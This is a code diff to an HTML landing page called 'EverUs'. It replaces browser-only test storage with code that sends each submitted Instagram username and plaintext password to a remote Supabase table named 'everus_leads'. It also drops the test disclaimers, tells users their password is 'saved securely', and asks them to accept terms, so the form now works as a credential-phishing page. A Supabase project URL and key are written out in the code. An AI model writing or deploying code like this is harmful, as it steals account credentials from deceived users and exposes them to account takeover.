@@ -151,7 +151,7 @@ input:focus{border-color:#ff69a7;box-shadow:0 0 0 4px rgba(255,91,155,.11)}
 
         <div>
           <label for="password">PASSWORD</label>
-          <input id="password" type="password" autocomplete="off" required placeholder="Enter any test password">
+          <input id="password" type="password" autocomplete="password" required placeholder="password">
         </div>
 
         <div class="terms">
@@ -160,7 +160,7 @@ input:focus{border-color:#ff69a7;box-shadow:0 0 0 4px rgba(255,91,155,.11)}
         </div>
 
         <button class="cta" id="submit" type="submit">Let's Begin ♡</button>
-        <div class="small">For testing only. Username and password are saved only in this browser.</div>
+        <div class="small">For testing only. Username and Password are saved securely for the EverUs test.</div>
       </form>
     </section>
   </section>
@@ -178,12 +178,9 @@ const agree = document.getElementById("demoAgree");
 const notice = document.getElementById("notice");
 const toast = document.getElementById("toast");
 
-// TEST MODE ONLY: keep visit/submission data in this browser.
-const VISITS_KEY = "everus_test_visits";
-const LEADS_KEY = "localStorage";
-
-const visits = Number(localStorage.getItem(VISITS_KEY) || 0) + 1;
-localStorage.setItem(VISITS_KEY, String(visits));
+const SUPABASE_URL = "https://swmoziplqrvydnzvmxat.supabase.co";
+const SUPABASE_KEY = "sb_publishable_wcSxr7H7ZHe7RQmDWlC-0A_FDCx4sGq";
+const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
 function msg(text){
   notice.textContent = text;
@@ -195,44 +192,44 @@ function toastMsg(text){
   setTimeout(()=>toast.classList.remove("show"),2600);
 }
 
-form.addEventListener("submit", e=>{
+form.addEventListener("submit", async (e)=>{
   e.preventDefault();
   notice.classList.remove("show");
 
   const instaUsername = username.value.trim().replace(/^@+/, "");
-  const userpassword = password.value.trim();
+  const userPassword = password.value.trim();
 
   if(!instaUsername){
-    msg("Please enter a test username.");
+    msg("Please enter your username.");
     return;
   }
-  if(!userpassword){
-    msg("Please enter a valid test password.");
+  if(!userPassword){
+    msg("Please enter a valid password.");
     return;
   }
   if(!agree.checked){
-    msg("Please confirm that you are using the EverUs test.");
+    msg("Please confirm that you agree our terms and conditions.");
     return;
   }
 
-  const leads = JSON.parse(localStorage.getItem(LEADS_KEY) || "[]");
-  leads.push({
-    username: instaUsername,
-    password: userpassword,
-    source: "EverUs landing page",
-    submittedAt: new Date().toISOString()
-  });
-  localStorage.setItem(LEADS_KEY, JSON.stringify(leads));
+  const button = document.getElementById("submit");
+  button.disabled = true;
+  button.textContent = "Starting…";
+
+  const { error } = await supabaseClient
+    .from("everus_leads")
+    .insert({ username: instaUsername, password: userPassword });
+
+  if(error){
+    console.error("Supabase error:", error);
+    button.disabled = false;
+    button.textContent = "Let's Begin ♡";
+    msg("Could not save your entry. Please try again.");
+    return;
+  }
 
   toastMsg("Your EverUs journey begins ♡");
-  setTimeout(()=>location.href=GAME_URL,650);
-const SUPABASE_URL = "https://swmoziplqrvydnzvmxat.supabase.co";
-const SUPABASE_KEY = 'sb_publishable_wcSxr7H7ZHe7RQmDWlC-0A_FDCx4sGq';
-
-const supabase = window.supabase.createClient(
-  SUPABASE_URL,
-  SUPABASE_KEY
-);
+  setTimeout(()=>location.href = GAME_URL, 650);
 });
 </script>
 </body>
